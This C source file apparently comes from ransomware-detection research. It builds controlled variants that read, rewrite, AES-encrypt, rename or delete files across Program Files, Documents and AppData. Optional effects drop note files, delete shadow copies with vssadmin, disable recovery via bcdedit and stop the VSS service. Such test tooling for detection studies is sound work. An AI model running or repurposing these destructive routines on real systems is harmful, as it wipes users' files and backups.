/*
 * hardneg_matrix.c - Programs that differ from each other in one relation at
 * a time, so that a feature responding to the change is the feature
 * measuring it.
 *
 * What this replaces, and why
 * ---------------------------
 * The first version varied a "method" -- overwrite in place, copy then
 * delete, rename, and so on -- picked because those are the shapes real
 * families take. That was the right list for asking which behaviours occur.
 * It was the wrong list for asking which relational features do any work,
 * because the methods differ in several relations at once and in how much
 * they do, so nothing could be attributed to anything.
 *
 * The shapes below are chosen the other way round: each sits at a distinct
 * point in the space the relational features measure, and neighbouring
 * shapes differ in exactly one of them.
 *
 *   A  read only                         read_not_write 1.0
 *   B  read, write the same path         rw_jaccard 1.0
 *   C  read, write elsewhere, keep       rw_jaccard 0.0, nothing destroyed
 *   D  read, write elsewhere, delete     chain_read_destroy 1.0, writes
 *   E  read, write the same path, delete chain_full 1.0
 *   F  read many, write one              rw_size_ratio -> 0
 *   K  read, delete, no write            chain_read_destroy 1.0, no writes
 *   H  scratch files, written, removed   write_not_read 1.0, originals intact
 *   I  rename only                       moves only, no read or write
 *   J  read, encrypt, write, delete      identical to D but for CryptEncrypt
 *
 * Four pairs differ in one thing and nothing else:
 *
 *   B / C            same read and write counts; the sets coincide or not
 *   D / J            same file operations; one encrypts and one does not
 *   D / K            same destruction; one writes a replacement, one does not
 *   sweep / random   same everything; the order the files are visited in
 *
 * The last is the cleanest test in the study. Every count is identical --
 * same files, same operations, same number of calls -- and only the sequence
 * differs. A model that separates them is reading a relation between events.
 * A model that does not, is not.
 *
 * Targets
 * -------
 * Several roots at once rather than the decoy folders. The decoys are 176
 * files in three directories, which is not enough for either the volume axis
 * or the order axis. It is also not where the damage happens: measured
 * across 400 ransomware analyses, 66.8% of destructive events land in
 * Program Files and 4.6% in the decoys.
 *
 * Nothing here is obfuscated, packed or evasive. It is meant to be read.
 */

#ifndef SHAPE
#define SHAPE 1   /* 1=A 2=B 3=C 4=D 5=E 6=F 7=K 8=H 9=I 10=J */
#endif
#ifndef LIMIT
#define LIMIT 200 /* files to process; 0 for everything found */
#endif
#ifndef ORDER
/* 0 sweeps the tree in the order the filesystem returns it, which is what a
 * family enumerating targets produces. 1 shuffles the list first. Same
 * files, same operations, same counts; only the sequence changes. */
#define ORDER 0
#endif
#ifndef TIMING
/* 0 as fast as possible, 1 evenly across four minutes, 2 in bursts of
 * twenty, 3 with an unpredictable wait between each.
 *
 * The waits stay well inside the ten-minute window. A variant that does not
 * finish is not a variant with different timing -- it is one that did less,
 * and the volume difference would swamp what the timing was meant to show. */
#define TIMING 0
#endif
#ifndef EFFECTS
#define EFFECTS 0 /* bitmask: 1 note, 2 wallpaper, 4 shadow, 8 recovery, 16 service */
#endif
#ifndef BUILD_REP
/* Repeats of the same parameters must differ as files.
 *
 * Without this the compiler emits the identical binary for every repeat, the
 * pipeline drops duplicate hashes, and five repeats become one row. The
 * repeats are wanted: they measure how much the sandbox varies between runs
 * of the same program, which is the floor under any difference the grid
 * shows.
 *
 * The value has to reach something the compiler cannot fold away, which is
 * why it goes into a string the program prints rather than into an integer
 * an optimiser can see is unused.
 */
#define BUILD_REP 0
#endif
#define STR2(x) #x
#define STR(x) STR2(x)
static const char BUILD_TAG[] =
    "hardneg build rep=" STR(BUILD_REP)
    " shape=" STR(SHAPE) " limit=" STR(LIMIT) " order=" STR(ORDER);

#ifndef FAKE_IMPORTS
/* Reference the API categories ransomware imports, without calling them for
 * any purpose. Every hard negative so far is a small C binary with about
 * sixty imports against a hundred or more for the ransomware, so a static
 * model that separates them may be reading the compiler rather than the
 * capability. This makes the import table resemble the positive class while
 * the behaviour stays whatever SHAPE says it is. */
#define FAKE_IMPORTS 0
#endif

#define EFFECT_NOTE      1
#define EFFECT_WALLPAPER 2
#define EFFECT_SHADOW    4
#define EFFECT_RECOVERY  8
#define EFFECT_SERVICE   16

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#if FAKE_IMPORTS
#include <tlhelp32.h>
#include <shlobj.h>
#include <wininet.h>
#endif

#define MAX_FILES      4000
#define MAX_DIRS       400
#define READ_CHUNK     65536
#define NEW_SUFFIX     ".matrix"
#define WINDOW_MS      240000
#define NOTE_NAME      "RESTORE_INSTRUCTIONS.txt"

static const char *NOTE_TEXT =
    "This folder was processed by a behaviour matrix test.\r\n"
    "Nothing is encrypted and nothing is demanded.\r\n";

static const struct { const char *root; int depth; } ROOTS[] = {
    { "C:\\Program Files",           3 },
    { "%LOCALAPPDATA%",              3 },
    { "%USERPROFILE%\\Documents",    3 },
    { "%APPDATA%",                   3 },
    { "%USERPROFILE%\\Desktop",      3 },
    { "C:\\Program Files (x86)",     3 },
    { "C:\\ProgramData",             2 },
    { NULL, 0 }
};

static char g_files[MAX_FILES][MAX_PATH];
static int  g_count = 0;
static char g_dirs[MAX_DIRS][MAX_PATH];
static int  g_dir_count = 0;

static void say(const char *fmt, ...)
{
    va_list a; va_start(a, fmt); vprintf(fmt, a); va_end(a);
    printf("\n"); fflush(stdout);
}

static unsigned int rnd(void)
{
    static unsigned int s = 0;
    if (!s) s = GetTickCount() | 1u;
    s ^= s << 13; s ^= s >> 17; s ^= s << 5;
    return s;
}

/* The sandbox agent is a .pyw under the user's Documents, and the analyser
 * stages itself under %LOCALAPPDATA%\Temp. Deleting either ends the analysis,
 * and the run is then recorded as a sample that failed rather than one that
 * interfered with the instrument. */
static int protected_path(const char *path, const char *name)
{
    const char *dot = strrchr(name, '.');
    if (dot && (_stricmp(dot, ".pyw") == 0 || _stricmp(dot, ".py") == 0))
        return 1;
    char low[MAX_PATH];
    strncpy(low, path, MAX_PATH - 1); low[MAX_PATH - 1] = '\0';
    for (char *p = low; *p; p++) *p = (char)tolower((unsigned char)*p);
    return strstr(low, "\\temp\\") != NULL || strstr(low, "\\cape") != NULL;
}

static void remember_dir(const char *dir)
{
    if (g_dir_count >= MAX_DIRS) return;
    for (int i = 0; i < g_dir_count; i++)
        if (_stricmp(g_dirs[i], dir) == 0) return;
    strncpy(g_dirs[g_dir_count], dir, MAX_PATH - 1);
    g_dirs[g_dir_count][MAX_PATH - 1] = '\0';
    g_dir_count++;
}

static void walk(const char *dir, int depth, int max_depth)
{
    if (depth > max_depth || g_count >= MAX_FILES) return;
    char pattern[MAX_PATH];
    if (snprintf(pattern, sizeof(pattern), "%s\\*", dir) >= (int)sizeof(pattern))
        return;

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        char full[MAX_PATH];
        if (snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName)
                >= (int)sizeof(full)) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            walk(full, depth + 1, max_depth);
        } else if (g_count < MAX_FILES) {
            size_t len = strlen(fd.cFileName), sfx = strlen(NEW_SUFFIX);
            if (len > sfx && _stricmp(fd.cFileName + len - sfx, NEW_SUFFIX) == 0)
                continue;
            if (protected_path(full, fd.cFileName)) continue;
            strncpy(g_files[g_count], full, MAX_PATH - 1);
            g_files[g_count][MAX_PATH - 1] = '\0';
            g_count++;
            remember_dir(dir);
        }
    } while (FindNextFileA(h, &fd) && g_count < MAX_FILES);
    FindClose(h);
}

static DWORD read_file(const char *path, BYTE *buf, DWORD cap)
{
    HANDLE h = CreateFileA(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD got = 0;
    ReadFile(h, buf, cap, &got, NULL);
    CloseHandle(h);
    return got;
}

static int write_file(const char *path, const BYTE *buf, DWORD len)
{
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD n = 0;
    WriteFile(h, buf, len, &n, NULL);
    CloseHandle(h);
    return n == len;
}

#if SHAPE == 10
/* Real Windows cryptography, here so that shape J differs from shape D in
 * this and nothing else. Whether any feature notices is the question. */
static int encrypt_buffer(BYTE *buf, DWORD *len, DWORD capacity)
{
    HCRYPTPROV prov = 0; HCRYPTHASH hash = 0; HCRYPTKEY key = 0;
    int ok = 0;
    if (!CryptAcquireContextA(&prov, NULL, NULL, PROV_RSA_AES,
                              CRYPT_VERIFYCONTEXT))
        return 0;
    if (CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash)) {
        const char *secret = "matrix-experiment-key";
        if (CryptHashData(hash, (const BYTE *)secret,
                          (DWORD)strlen(secret), 0) &&
            CryptDeriveKey(prov, CALG_AES_256, hash, 0, &key)) {
            DWORD n = *len;
            if (CryptEncrypt(key, 0, TRUE, 0, buf, &n, capacity)) {
                *len = n; ok = 1;
            }
            CryptDestroyKey(key);
        }
        CryptDestroyHash(hash);
    }
    CryptReleaseContext(prov, 0);
    return ok;
}
#endif

#if FAKE_IMPORTS
/* Referenced behind a condition that is never true, so the linker keeps the
 * imports and the program never calls them. The import table gains the
 * categories a family's has; the behaviour gains nothing. */
static void reference_only(void)
{
    if (GetTickCount() == 0xFFFFFFFFu) {
        HCRYPTPROV p = 0;
        CryptAcquireContextA(&p, NULL, NULL, PROV_RSA_AES, 0);
        CryptReleaseContext(p, 0);
        CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        OpenProcess(PROCESS_TERMINATE, FALSE, 0);
        TerminateProcess(NULL, 0);
        SHGetFolderPathA(NULL, 0, NULL, 0, NULL);
        GetLogicalDriveStringsA(0, NULL);
        RegCreateKeyExA(HKEY_CURRENT_USER, NULL, 0, NULL, 0, 0, NULL, NULL, NULL);
        RegSetValueExA(NULL, NULL, 0, REG_SZ, NULL, 0);
        InternetOpenA(NULL, 0, NULL, NULL, 0);
        IsDebuggerPresent();
        CheckRemoteDebuggerPresent(NULL, NULL);
        OpenSCManagerA(NULL, NULL, 0);
    }
}
#endif

static void run_command(const char *command)
{
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    char buf[512];
    strncpy(buf, command, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
    if (CreateProcessA(NULL, buf, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static void do_effects(void)
{
#if (EFFECTS & EFFECT_NOTE)
    {
        int n = 0;
        for (int i = 0; i < g_dir_count && i < 20; i++) {
            char p[MAX_PATH];
            snprintf(p, sizeof(p), "%s\\%s", g_dirs[i], NOTE_NAME);
            if (write_file(p, (const BYTE *)NOTE_TEXT,
                           (DWORD)strlen(NOTE_TEXT))) n++;
        }
        say("effect note: %d directories", n);
    }
#endif
#if (EFFECTS & EFFECT_WALLPAPER)
    {
        char p[MAX_PATH];
        if (ExpandEnvironmentStringsA("%TEMP%\\matrix_wp.bmp", p, sizeof(p))) {
            BYTE bmp[] = {0x42,0x4D,0x46,0,0,0,0,0,0,0,0x36,0,0,0,0x28,0,0,0,
                          0x02,0,0,0,0x02,0,0,0,0x01,0,0x18,0,0,0,0,0,0x10,0,0,0,
                          0x13,0x0B,0,0,0x13,0x0B,0,0,0,0,0,0,0,0,0,0,
                          0x20,0x20,0x20,0x20,0x20,0x20,0,0,
                          0x20,0x20,0x20,0x20,0x20,0x20,0,0};
            write_file(p, bmp, sizeof(bmp));
            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, p,
                                  SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            say("effect wallpaper");
        }
    }
#endif
#if (EFFECTS & EFFECT_SHADOW)
    run_command("cmd.exe /c vssadmin.exe delete shadows /all /quiet");
    say("effect shadow");
#endif
#if (EFFECTS & EFFECT_RECOVERY)
    run_command("cmd.exe /c bcdedit.exe /set {default} recoveryenabled no");
    say("effect recovery");
#endif
#if (EFFECTS & EFFECT_SERVICE)
    run_command("cmd.exe /c net stop VSS /y");
    say("effect service");
#endif
}

static void pause_between(int index, int total)
{
#if TIMING == 1
    if (total > 0) Sleep((DWORD)(WINDOW_MS / total));
    (void)index;
#elif TIMING == 2
    if (index > 0 && (index % 20) == 0) Sleep(5000);
    (void)total;
#elif TIMING == 3
    Sleep(50 + rnd() % 2500);
    (void)index; (void)total;
#else
    (void)index; (void)total;
#endif
}

int main(void)
{
    say("matrix: shape=%d limit=%d order=%d timing=%d effects=%d fake=%d",
        SHAPE, LIMIT, ORDER, TIMING, EFFECTS, FAKE_IMPORTS);
    say("%s", BUILD_TAG);
#if FAKE_IMPORTS
    reference_only();
#endif
    Sleep(3000);

    char dir[MAX_PATH];
    for (int i = 0; ROOTS[i].root; i++) {
        if (g_count >= MAX_FILES) break;
        if (ExpandEnvironmentStringsA(ROOTS[i].root, dir, sizeof(dir)))
            walk(dir, 0, ROOTS[i].depth);
    }
    say("found %d files across %d directories", g_count, g_dir_count);

    /* Cut to the limit before shuffling, not after.
     *
     * The first version shuffled the whole list and then took the first N,
     * which meant the two orders processed different files: the sweep took
     * the first N the filesystem returned, and the shuffle took N drawn from
     * everywhere. Those files differ in size and type, so the run lengths
     * differed too -- 4,036 API calls against 3,321 at the median, an 18%
     * gap. The pair was supposed to differ in nothing but order and differed
     * in the work as well, so a difference in the outcome could not be
     * attributed.
     *
     * Cutting first fixes it: both orders process exactly the same N files,
     * and the only thing that changes is the sequence they are visited in.
     */
#if LIMIT > 0
    if (g_count > LIMIT) g_count = LIMIT;
#endif

#if ORDER == 1
    for (int i = g_count - 1; i > 0; i--) {
        int j = (int)(rnd() % (unsigned)(i + 1));
        char tmp[MAX_PATH];
        strcpy(tmp, g_files[i]);
        strcpy(g_files[i], g_files[j]);
        strcpy(g_files[j], tmp);
    }
    say("order: shuffled");
#else
    say("order: as enumerated");
#endif
    say("processing %d files", g_count);

    BYTE *buf = (BYTE *)malloc(READ_CHUNK);
    if (!buf) return 1;
    int did_read = 0, did_write = 0, did_delete = 0, did_move = 0;

#if SHAPE == 6
    char out_path[MAX_PATH];
    if (!ExpandEnvironmentStringsA("%TEMP%\\matrix_bundle.bin",
                                    out_path, sizeof(out_path)))
        strcpy(out_path, "C:\\matrix_bundle.bin");
    HANDLE out = CreateFileA(out_path, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
#endif

    for (int i = 0; i < g_count; i++) {
        const char *path = g_files[i];
        char alt[MAX_PATH];
        snprintf(alt, sizeof(alt), "%s%s", path, NEW_SUFFIX);

#if SHAPE == 1
        if (read_file(path, buf, READ_CHUNK)) did_read++;

#elif SHAPE == 2
        {
            DWORD len = read_file(path, buf, READ_CHUNK);
            if (len) { did_read++; if (write_file(path, buf, len)) did_write++; }
        }

#elif SHAPE == 3
        {
            DWORD len = read_file(path, buf, READ_CHUNK);
            if (len) { did_read++; if (write_file(alt, buf, len)) did_write++; }
        }

#elif SHAPE == 4
        {
            DWORD len = read_file(path, buf, READ_CHUNK);
            if (len) {
                did_read++;
                if (write_file(alt, buf, len)) {
                    did_write++;
                    if (DeleteFileA(path)) did_delete++;
                }
            }
        }

#elif SHAPE == 5
        {
            DWORD len = read_file(path, buf, READ_CHUNK);
            if (len) {
                did_read++;
                if (write_file(path, buf, len)) {
                    did_write++;
                    if (DeleteFileA(path)) did_delete++;
                }
            }
        }

#elif SHAPE == 6
        {
            DWORD len = read_file(path, buf, READ_CHUNK);
            if (len && out != INVALID_HANDLE_VALUE) {
                did_read++;
                DWORD n = 0;
                WriteFile(out, buf, len, &n, NULL);
            }
        }

#elif SHAPE == 7
        {
            DWORD len = read_file(path, buf, READ_CHUNK);
            if (len) { did_read++; if (DeleteFileA(path)) did_delete++; }
        }

#elif SHAPE == 8
        {
            char scratch[MAX_PATH];
            for (int k = 0; k < 3; k++) {
                snprintf(scratch, sizeof(scratch), "%s.tmp%d", path, k);
                if (write_file(scratch, (const BYTE *)NOTE_TEXT,
                               (DWORD)strlen(NOTE_TEXT))) {
                    did_write++;
                    if (DeleteFileA(scratch)) did_delete++;
                }
            }
        }

#elif SHAPE == 9
        if (MoveFileA(path, alt)) did_move++;

#elif SHAPE == 10
        {
            DWORD len = read_file(path, buf, READ_CHUNK);
            if (len) {
                did_read++;
                DWORD out_len = len;
                if (!encrypt_buffer(buf, &out_len, READ_CHUNK)) out_len = len;
                if (write_file(alt, buf, out_len)) {
                    did_write++;
                    if (DeleteFileA(path)) did_delete++;
                }
            }
        }
#else
#error "unknown SHAPE"
#endif
        pause_between(i, g_count);
    }

#if SHAPE == 6
    if (out != INVALID_HANDLE_VALUE) { CloseHandle(out); did_write = 1; }
#endif

    free(buf);
    say("read=%d write=%d delete=%d move=%d",
        did_read, did_write, did_delete, did_move);
    do_effects();
    say("done");
    return 0;
}
